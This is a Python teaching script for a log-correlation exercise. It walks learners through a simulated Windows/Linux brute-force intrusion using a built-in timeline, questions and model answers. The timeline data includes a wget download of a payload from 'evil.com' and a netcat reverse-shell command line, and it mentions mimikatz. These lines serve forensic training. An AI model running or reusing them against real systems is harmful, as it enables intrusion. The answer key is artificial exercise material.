#!/usr/bin/env python3
"""
correlation_exercise.py
Cross-platform log correlation exercise for the OS Log Analysis guide.

Reads sample logs from /var/log/samples/ and presents a guided incident
reconstruction exercise.  Run inside the log-analysis container:

    python3 /scripts/correlation_exercise.py
    python3 /scripts/correlation_exercise.py --reveal   # show model answers

Scenario: A hybrid Windows/Linux environment was attacked on 2024-01-14.
          Correlate Windows event logs and Linux auth.log to answer the
          investigation questions.
"""

import json
import os
import sys
import argparse
from datetime import datetime


# ─────────────────────────────────────────────────────────────────────────────
# Paths
# ─────────────────────────────────────────────────────────────────────────────
WINDOWS_EVENTS_FILE = "/var/log/samples/windows_process_events.json"
LINUX_AUTH_LOG      = "/var/log/samples/auth.log"


# ─────────────────────────────────────────────────────────────────────────────
# Colour helpers
# ─────────────────────────────────────────────────────────────────────────────
class C:
    RED    = "\033[91m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    GREEN  = "\033[92m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"

def h1(text):  return f"\n{C.BOLD}{C.CYAN}{'='*70}\n  {text}\n{'='*70}{C.RESET}"
def h2(text):  return f"\n{C.BOLD}{text}{C.RESET}"
def warn(text): return f"{C.YELLOW}[!] {text}{C.RESET}"
def crit(text): return f"{C.RED}[CRITICAL] {text}{C.RESET}"
def ok(text):   return f"{C.GREEN}[+] {text}{C.RESET}"
def dim(text):  return f"{C.DIM}{text}{C.RESET}"


# ─────────────────────────────────────────────────────────────────────────────
# Load data
# ─────────────────────────────────────────────────────────────────────────────
def load_windows_events():
    if not os.path.exists(WINDOWS_EVENTS_FILE):
        print(warn(f"Windows events file not found: {WINDOWS_EVENTS_FILE}"))
        print("    Make sure you are running inside the container.")
        return []
    with open(WINDOWS_EVENTS_FILE) as f:
        return json.load(f)

def load_auth_log():
    if not os.path.exists(LINUX_AUTH_LOG):
        print(warn(f"Linux auth.log not found: {LINUX_AUTH_LOG}"))
        return []
    with open(LINUX_AUTH_LOG) as f:
        return f.readlines()


# ─────────────────────────────────────────────────────────────────────────────
# Build unified timeline
# ─────────────────────────────────────────────────────────────────────────────
# Hand-coded correlation between the two sample log sources.
# Each entry: (time_str, source, description, is_malicious)
CORRELATION_TIMELINE = [
    ("2024-01-14 09:00:00", "Windows Security Log",
     "Event 4624: alice logged on to WORKSTATION1 — Type 10 (RDP) from 192.168.1.5",
     False),
    ("2024-01-14 09:15:00", "Linux auth.log",
     "sshd: Accepted publickey for alice from 192.168.1.5 — normal work session",
     False),
    ("2024-01-14 14:20:00", "Linux auth.log",
     "sshd: Failed password for alice from 10.0.5.123 (first of many)",
     True),
    ("2024-01-14 14:23:01", "Windows Security Log",
     "Event 4625: Failed logon for alice from 10.0.5.123 — Network (Type 3)",
     True),
    ("2024-01-14 14:23:02", "Windows Security Log",
     "Event 4625: Failed logon for alice from 10.0.5.123 — Network (Type 3)",
     True),
    ("2024-01-14 14:47:23", "Windows Security Log",
     "Event 4624: alice SUCCESSFULLY logged on from 10.0.5.123 — Network (Type 3)",
     True),
    ("2024-01-14 14:47:23", "Linux auth.log",
     "sshd: Accepted password for alice from 10.0.5.123 — FILESERVER1 breached",
     True),
    ("2024-01-14 14:48:01", "Windows Security Log",
     "Event 4688: mimikatz.exe spawned — C:\\Users\\alice\\AppData\\Local\\Temp\\mimikatz.exe",
     True),
    ("2024-01-14 14:48:01", "Linux auth.log",
     "sudo: alice ran 'sudo su -' — root privilege obtained on FILESERVER1",
     True),
    ("2024-01-14 14:48:30", "Linux auth.log",
     "root: wget http://evil.com/payload.sh -O /tmp/payload.sh",
     True),
    ("2024-01-14 14:49:10", "Windows Security Log",
     "Event 4688: nc64.exe — 'nc64.exe 10.0.5.123 4444 -e cmd.exe' (reverse shell)",
     True),
    ("2024-01-14 14:50:15", "Windows Security Log",
     "Event 7045: Service 'WindowsUpdater' installed — C:\\ProgramData\\svchost32.exe (SYSTEM)",
     True),
    ("2024-01-14 14:50:17", "Windows Security Log",
     "Event 4698: Scheduled task '\\WindowsTelemHelper' created — encoded PowerShell action",
     True),
    ("2024-01-14 14:51:00", "Linux auth.log",
     "cron: (root) cron job added for /tmp/payload.sh (persistence)",
     True),
    ("2024-01-14 15:10:44", "Windows Security Log",
     "Event 1102: Security audit log CLEARED by alice — anti-forensics",
     True),
]


def print_timeline(events):
    print(h1("UNIFIED ATTACK TIMELINE"))
    print(dim("  Time                 Source                  Description"))
    print(dim("  " + "-"*66))

    for time_str, source, desc, malicious in events:
        marker = f"{C.RED}[!]{C.RESET}" if malicious else f"{C.GREEN}[ ]{C.RESET}"
        src_display = source[:23].ljust(23)
        print(f"  {marker} {time_str}  {C.DIM}{src_display}{C.RESET}  {desc}")

    print()
    print(f"  {C.GREEN}[ ]{C.RESET} = Normal activity    "
          f"{C.RED}[!]{C.RESET} = Malicious/suspicious")


# ─────────────────────────────────────────────────────────────────────────────
# Exercise questions
# ─────────────────────────────────────────────────────────────────────────────
QUESTIONS = [
    {
        "number": 1,
        "question": "What is alice's normal (legitimate) source IP address?",
        "hint": "Look for successful logins from the beginning of the day (09:00).",
        "answer": (
            "192.168.1.5\n\n"
            "    Evidence:\n"
            "    • Windows Event 4624 at 09:00 — logon Type 10 (RDP) from 192.168.1.5\n"
            "    • Linux auth.log at 09:15 — 'Accepted publickey for alice from 192.168.1.5'\n"
            "    This is her desktop/office workstation — a trusted internal IP."
        ),
    },
    {
        "number": 2,
        "question": "What IP did the attacker use? How do you know it is the attacker and not alice?",
        "hint": "Which IP appears in BOTH failed and successful logons?  Is it in the trusted IP range?",
        "answer": (
            "10.0.5.123\n\n"
            "    Evidence (three indicators together confirm this is the attacker):\n"
            "    1. HIGH FAILURE COUNT: 10.0.5.123 generated multiple 4625 (failed logon)\n"
            "       events in a short window — classic brute-force pattern.\n"
            "    2. UNUSUAL IP: Not in the known-good IP space (alice normally comes from\n"
            "       192.168.1.5). 10.0.5.123 is an external/unknown subnet.\n"
            "    3. BREACH CONFIRMATION: After all the failures, 10.0.5.123 eventually\n"
            "       succeeded (Event 4624 at 14:47:23). This is 'brute force success'.\n"
            "    Alice was at her desk (192.168.1.5) all day — she could not simultaneously\n"
            "    be logging in from two different IPs."
        ),
    },
    {
        "number": 3,
        "question": "Which system was compromised first — the Windows workstation or the Linux file server?",
        "hint": "Look carefully at timestamps on the Windows 4624 and Linux auth.log success events.",
        "answer": (
            "Both were breached at the same moment (14:47:23) — the attacker used the\n"
            "    same stolen credentials against both systems in parallel or in rapid succession.\n\n"
            "    However, the attack *preparation* (brute force attempts) began at ~14:20 on\n"
            "    the Linux side and ~14:23 on Windows, suggesting the Linux server was targeted\n"
            "    slightly earlier.  Both share the same username (alice) and the same attacker IP\n"
            "    (10.0.5.123), meaning the attacker reused credentials across both platforms.\n\n"
            "    Key insight: credential reuse across OS boundaries is a critical risk."
        ),
    },
    {
        "number": 4,
        "question": "List the 5 attack stages (Initial Access → Persistence) in order with times.",
        "hint": "Use the MITRE ATT&CK stages: Initial Access, Execution, Privilege Escalation, "
                "Lateral Movement, Persistence.",
        "answer": (
            "Stage 1 — INITIAL ACCESS (14:20–14:47)\n"
            "    Technique: T1110 — Brute Force (password spraying)\n"
            "    Evidence: Multiple 4625 failures + auth.log 'Failed password'\n"
            "    from 10.0.5.123 before eventual success.\n\n"
            "    Stage 2 — EXECUTION (14:48)\n"
            "    Technique: T1059 — Command and Scripting Interpreter\n"
            "    Evidence: Windows 4688 — mimikatz.exe ran from Temp directory;\n"
            "    nc64.exe reverse shell launched (nc64.exe 10.0.5.123 4444 -e cmd.exe).\n"
            "    Linux: wget downloaded payload.sh to /tmp/.\n\n"
            "    Stage 3 — PRIVILEGE ESCALATION (14:48)\n"
            "    Technique: T1548 — Abuse Elevation Control Mechanism\n"
            "    Evidence: Linux auth.log 'alice ran sudo su -' immediately after SSH login.\n"
            "    Windows: mimikatz credential dump enables Pass-the-Hash.\n\n"
            "    Stage 4 — LATERAL MOVEMENT (14:48–14:49)\n"
            "    Technique: T1021 — Remote Services (SSH + SMB)\n"
            "    Evidence: Attacker used dumped creds to move between WORKSTATION1 and\n"
            "    FILESERVER1; nc64.exe -e cmd.exe establishes C2 channel.\n\n"
            "    Stage 5 — PERSISTENCE (14:50–14:51)\n"
            "    Technique: T1053 (Scheduled Task), T1543 (Create Service)\n"
            "    Evidence: Windows 7045 (WindowsUpdater service), 4698 (scheduled task\n"
            "    with EncodedCommand); Linux cron job for /tmp/payload.sh added as root."
        ),
    },
    {
        "number": 5,
        "question": "Which log source provided the most detailed evidence of attacker activity?",
        "hint": "Compare: what can you see in Windows events vs Linux auth.log?",
        "answer": (
            "Linux auth.log — because it recorded:\n"
            "    • Individual failed password attempts (timing, username, source IP)\n"
            "    • The exact successful login timestamp\n"
            "    • The sudo escalation command ('sudo su -')\n"
            "    • The wget payload download\n"
            "    • The cron persistence entry\n\n"
            "    Windows Security Log also provided high value:\n"
            "    • Process creation (4688) with full command lines (mimikatz, nc64)\n"
            "    • Persistence artifacts (7045 new service, 4698 scheduled task)\n"
            "    • Anti-forensics (1102 log cleared)\n\n"
            "    Best practice: You need BOTH.  Windows event logs capture host-side\n"
            "    execution; Linux auth.log captures authentication and privilege events.\n"
            "    Neither alone tells the complete story."
        ),
    },
    {
        "number": 6,
        "question": "What defensive controls would have prevented or detected this attack earlier?",
        "hint": "Think about: password policy, MFA, alerting on failed logins, network segmentation.",
        "answer": (
            "PREVENTION:\n"
            "    1. Multi-Factor Authentication (MFA) — brute force is useless if a second\n"
            "       factor is required. This is the single highest-impact control here.\n"
            "    2. Account lockout policy — lock after 5–10 failed attempts per IP.\n"
            "    3. Network segmentation — 10.0.5.123 should not have been able to reach\n"
            "       internal systems directly; a bastion host or VPN would have added a barrier.\n"
            "    4. Disable password authentication for SSH — enforce key-based auth only.\n\n"
            "    DETECTION (earlier warning):\n"
            "    5. SIEM alert: >5 failed logins from the same IP in 60 seconds → page on-call.\n"
            "    6. Impossible travel detection: alice on 192.168.1.5 AND 10.0.5.123 simultaneously.\n"
            "    7. Alert on 4688 events for known-malicious process names (mimikatz.exe, nc*.exe).\n"
            "    8. Alert on Windows Event 1102 (log cleared) — this is almost always malicious.\n"
            "    9. EDR/AV signatures for credential dumpers in Temp/Downloads paths."
        ),
    },
]


def print_question(q, reveal):
    print(h2(f"\nQuestion {q['number']}: {q['question']}"))
    print(f"  {C.DIM}Hint: {q['hint']}{C.RESET}")
    if reveal:
        print(f"\n  {C.GREEN}Model Answer:{C.RESET}")
        for line in q["answer"].split("\n"):
            print(f"    {line}")
    else:
        print(f"\n  {C.DIM}(Run with --reveal to see the model answer){C.RESET}")


# ─────────────────────────────────────────────────────────────────────────────
# Log evidence summary
# ─────────────────────────────────────────────────────────────────────────────
def print_evidence_summary(win_events, auth_lines):
    print(h1("EVIDENCE SUMMARY"))

    # Windows
    print(h2("\n  Windows Security Events loaded:"))
    eid_counts: dict = {}
    for ev in win_events:
        eid = ev.get("id", "?")
        eid_counts[eid] = eid_counts.get(eid, 0) + 1

    eid_labels = {
        4624: "Logon success",
        4625: "Logon failure",
        4648: "Explicit credential use",
        4688: "Process creation",
        7045: "Service installed",
        4698: "Scheduled task created",
        1102: "Security log cleared",
    }
    for eid, count in sorted(eid_counts.items()):
        label = eid_labels.get(eid, "")
        hi = eid in (7045, 1102, 4698)
        color = C.RED if hi else C.RESET
        print(f"    {color}Event {eid:<6} {label:<35} × {count}{C.RESET}")

    # Linux
    failures = [l for l in auth_lines if "Failed password" in l]
    successes = [l for l in auth_lines if "Accepted" in l]
    sudo_cmds = [l for l in auth_lines if "COMMAND" in l or "sudo" in l.lower()]
    print(h2("\n  Linux auth.log entries loaded:"))
    print(f"    Total lines:          {len(auth_lines)}")
    print(f"    Failed password:      {len(failures)}")
    print(f"    Accepted (success):   {len(successes)}")
    print(f"    sudo/COMMAND entries: {len(sudo_cmds)}")

    # Brute force IPs
    ip_fails: dict = {}
    for line in failures:
        parts = line.split()
        for i, part in enumerate(parts):
            if part == "from" and i + 1 < len(parts):
                ip = parts[i + 1]
                ip_fails[ip] = ip_fails.get(ip, 0) + 1

    if ip_fails:
        print(h2("\n  Brute force candidates (IPs with failed logins):"))
        for ip, count in sorted(ip_fails.items(), key=lambda x: -x[1]):
            color = C.RED if count >= 5 else C.YELLOW if count > 1 else C.RESET
            print(f"    {color}{ip:<20}  {count} failure(s){C.RESET}")

    # Check for breach confirmation
    attacker_ips = [ip for ip, c in ip_fails.items() if c >= 5]
    for ip in attacker_ips:
        for line in successes:
            if ip in line:
                print()
                print(crit(f"BREACH CONFIRMED: {ip} had failures AND a successful login!"))
                print(f"    {line.strip()}")


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Cross-platform log correlation exercise (OS Log Analysis Guide)"
    )
    parser.add_argument(
        "--reveal", action="store_true",
        help="Print model answers alongside each question"
    )
    parser.add_argument(
        "--timeline-only", action="store_true",
        help="Only print the unified attack timeline, then exit"
    )
    args = parser.parse_args()

    print(h1("CROSS-PLATFORM LOG CORRELATION EXERCISE"))
    print("""
  Scenario
  --------
  You are investigating a security incident at a company running a hybrid
  Windows/Linux environment.  The SIEM fired an alert at 14:51 UTC on
  2024-01-14.  You have been given:

    • Windows Security Event Log (JSON)  — WORKSTATION1
    • Linux auth.log                     — FILESERVER1

  Your task: correlate both log sources to reconstruct the full attack.
""")

    # Load data
    win_events = load_windows_events()
    auth_lines = load_auth_log()

    if not win_events and not auth_lines:
        print(warn("No log data could be loaded.  Proceeding with built-in scenario only."))

    # Evidence summary
    if win_events or auth_lines:
        print_evidence_summary(win_events, auth_lines)

    # Timeline
    print_timeline(CORRELATION_TIMELINE)

    if args.timeline_only:
        sys.exit(0)

    # Questions
    print(h1("INVESTIGATION QUESTIONS"))
    print(f"  Answer each question using the timeline and log evidence above.")
    if not args.reveal:
        print(f"  {C.YELLOW}Tip: re-run with --reveal to see model answers.{C.RESET}")

    for q in QUESTIONS:
        print_question(q, args.reveal)
        print()

    # Summary table
    print(h1("CORRELATION TECHNIQUES SUMMARY"))
    print("""
  Technique                      What it found
  ─────────────────────────────  ───────────────────────────────────────────────
  Failure count by IP            Attacker IP 10.0.5.123 (brute force)
  Success-after-failure          Breach confirmation at 14:47:23
  Timestamp alignment            Same IP hit Windows + Linux simultaneously
  Impossible travel detection    alice on two IPs at the same time → impersonation
  Process name blocklist (4688)  mimikatz.exe, nc64.exe in Temp/Downloads
  Event ID 1102                  Log cleared → anti-forensics
  cron + wget in auth.log        Payload download + persistence chain
""")

    print(ok("Exercise complete.  Review the timeline and answers, then discuss with your team."))
    print()


if __name__ == "__main__":
    main()
